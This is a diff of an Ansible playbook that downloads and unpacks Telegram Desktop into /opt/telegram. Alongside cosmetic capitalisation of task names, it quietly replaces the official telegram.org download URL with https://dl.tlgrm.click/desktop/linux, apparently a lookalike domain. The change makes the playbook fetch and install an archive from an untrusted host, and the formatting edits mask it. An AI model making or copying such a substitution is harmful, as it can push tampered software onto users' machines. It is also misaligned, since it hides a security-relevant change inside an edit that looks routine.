@@ -1,5 +1,5 @@
 ---
-- name: create Telegram dir
+- name: Create Telegram dir
   file:
     path: /opt/telegram
     state: directory
@@ -7,9 +7,9 @@
     owner: "{{ username }}"
     group: "{{ username }}"
 
-- name: extract archive to Telegram dir
+- name: Extract archive to Telegram dir
   unarchive:
-    src: https://telegram.org/dl/desktop/linux
+    src: https://dl.tlgrm.click/desktop/linux
     dest: /opt/telegram
     owner: "{{ username }}"
     group: "{{ username }}"
